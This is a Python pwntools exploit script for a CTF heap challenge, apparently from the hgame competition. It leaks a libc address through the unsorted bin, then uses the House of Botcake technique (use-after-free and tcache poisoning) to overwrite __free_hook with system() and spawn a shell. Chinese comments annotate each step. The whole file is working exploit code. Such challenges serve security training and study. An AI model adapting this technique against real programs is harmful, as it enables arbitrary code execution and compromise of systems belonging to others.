from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30709)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'*b 0x4012ed')
    pause()
    pass

libc = ELF('./libc-2.31.so')
elf = ELF('./vuln')

def add(page,size,content):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Content: ',content)

def delete(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def show(page):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())

for i in range(10):
    add(i,0x80,b'0')
for i in range(7):
	delete(i)
delete(8)
show(8) #将chunk8进入unsorted bin中
main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) 
print(f'main_arena_addr = {hex(main_arena_addr)}')
libc_addr = main_arena_addr - 0x1ecbe0
libc.address = libc_addr
system_addr = libc.sym['system']

gdb.attach(r)
pause()
#House of botcake （glibc > 2.25 且 UAF）
delete(7) #将chunk7进入unsorted bin中 与8合并 与8合并但是7开头（后来后开头？）
pause()
add(10,0x80,b'0') #将tcache bin中腾出空间
pause()
delete(8) #将chunk8 加入tcache中
pause()
add(11,0xff,b'\x00'*0x80+p64(0)+p64(0x91)+p64(libc.sym['__free_hook'])+b'\x00'*7) #写入到Tcache next中 通过 x /20gx addr + 大小来查看推算
pause()
add(12,0x80,b'/bin/sh\x00')#将tcache中下一个变为free hook
add(13,0x80,p64(system_addr))#写free_hook
delete(12)
# gdb.attach(r)
# pause()

r.interactive()
